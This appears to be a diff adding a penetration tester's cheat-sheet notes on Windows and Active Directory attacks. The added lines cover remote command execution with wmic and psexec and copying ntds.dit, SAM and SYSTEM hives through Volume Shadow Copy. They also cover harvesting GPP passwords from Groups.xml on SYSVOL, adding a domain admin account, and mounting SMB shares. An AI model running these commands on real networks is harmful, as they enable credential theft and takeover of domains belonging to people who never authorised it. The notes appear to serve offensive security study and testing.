@@ -9,3 +9,79 @@ https://live.sysinternals.com/
 
 LDAP Search
 ldapsearch -LLL -H ldap://domain.corp.com -x -D 'domain\YOUR_USER' -W -b 'dc=domain,dc=corp,dc=com' '(cn=TARGET_USER)'
+
+#Windows 
+	• runas 
+	• schtasks 
+	• wmic - wmic /node: targetip /user:<> /password: <> process call create [command] 
+	• net user 
+	• net localgroup 
+	• tasklist 
+	• net start  
+	• sc - only runs for 30seconds before its killed 
+	• reg 
+	• at - schedule job in the future 
+Psexec 
+	• psexec is not built into windows but it is free to download and use 
+	• the  microsoft sysinternal psexec tool leaves behind the psexec service on target after it is executed for the first time, BUT metasploit psexec cleans up after itself 
+	• psexec \\targetip -d  -u user -p password [command] 
+	• need administrator access 
+	• metasploit psexec exploit writes an executable to target, creates a service 
+	• may need to turn of ntlmv2  
+	• set NTLM::UseNTLM2_session false 
+
+Passwords 
+	• windows LANMAN passwords are all uppercase (still used on 2k3 servers) 
+	• NT format are not all caps 
+	• lm2ntcrack.rb can convert LANMAN all caps hashes to NTformat mixed case proper 
+	• SAM = backup file for windows 
+		○ c:\windows\repair 
+		○ c:\winnt\repair 
+	• ntds.dit = where domain password are found 
+	• net accounts /domain 
+	• by default, original admin account cant be lockout. Unless sys admin changes it 
+	• Linux PAM file 
+		○ grep tally /etc/pam.d/* 
+		○ grep tally /etc/pam.conf 
+		○ by default root is not lockedout via PAm, unless 'even_deny_root_account' is set in pam.d file 
+		
+• Domain Controllers store accounts info at  
+	• echo %logonserver% 
+	• %systemroot%\ntds\ntds.di ( will be large file) 
+	• http://csababarta.com/downloads/ntdsxtract/ntds_forensics.pdf 
+	• use Volume Shadow Copy (VSS) to retrieve ntds.dit (much safer than extracting hashes from memory) 
+	• Technique for VSS copy  by Tim Tomes at  
+		1. Gain local admin or local system privs 
+		2. upload VSSOwn and use it to activate VSS and create snapshot (pg97) or https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/ or https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/ 
+		3. C:\> cscript vssown.vbs /status 
+		4. C:\> cscript vssown.vbs /start 
+		5. C:\> cscript vssown.vbs /create 
+		6. copy the ntds.dit file out of backup 
+		7. C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\ntds\ntds.dit ntdsbackup.dit 
+		8. C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\system32\config\SYSTEM systembackup.bak 
+		9. C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\windows\system32\config\SAM sambackup.bak 
+	• Getting Groups.xml file - get local admin creds on DC 
+		1. net use z: \\dc01\SYSVOL  
+		2. dir /s Groups.xml 
+		3. copy Z:\megacorpone.com\Policies\{...}\Machine\Preferences\Groups\Groups.xml C:\Users\mike.MEGACORPONE\Documents 
+		4. use gppdecrpt to get cleartext password 
+ 
+	• net group “Domain Admins” /domain 
+		○ Tasklist /v 
+		○ migrate to a domain admin running process 
+		
+	• Add a domain admin in a windows shell 
+		○ net user /add /domain 
+net group “Domain Admins” /add /domain 
+	• Password Format 
+		○ $1$ = MD5 
+		○ $2$ = Blowfish 
+		○ $5$ = SHA-256 
+		○ $6$ = SHA-512 
+
+	• SMBMounting 
+		a. echo $SMBHASH <hash> 
+		b. mkdir /mnt/target1 
+		c. mount (checks what is currently mounted) 
+		d. cd /home/tools/samba*/source/bin 
+./smbmount //10.10.10.10/c$ /mnt/target -o username=<username>
